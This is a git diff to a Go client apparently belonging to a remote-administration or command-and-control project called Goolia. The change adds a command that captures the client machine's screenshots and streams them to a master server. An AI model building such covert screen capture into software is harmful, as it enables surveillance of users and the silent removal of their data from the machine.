@@ -8,6 +8,7 @@ import (
 	"time"
 
 	osinfo "github.com/NukeDev/Goolia/client/osinfo"
+	utils "github.com/NukeDev/Goolia/client/utils"
 	pb "github.com/NukeDev/Goolia/proto"
 	"github.com/denisbrodbeck/machineid"
 	externalip "github.com/glendc/go-external-ip"
@@ -31,6 +32,7 @@ func main() {
 
 }
 
+//ClientProcess - Main instance
 func ClientProcess() {
 	for {
 		time.Sleep(time.Second * 5)
@@ -112,6 +114,29 @@ func ClientProcess() {
 							break
 						}
 						log.Printf("Sending OSINFO to master server")
+
+					}
+				case "screenshot":
+					{
+						myShots := utils.GetClientScreenshots()
+
+						if len(myShots) > 0 {
+
+							b, err := json.Marshal(myShots)
+
+							if err != nil {
+								log.Printf("%v", err)
+
+							}
+
+							req := pb.Request{ClientID: localClient.ID, ClientIPAddress: localClient.IPAddress, Command: "screenshot", Data: b}
+
+							if err := stream.Send(&req); err != nil {
+								log.Printf("can not send SCREENSHOTS to master server %v", err)
+								break
+							}
+							log.Printf("Sending SCREENSHOTS to master server")
+						}
 
 					}
 				case "not-found":
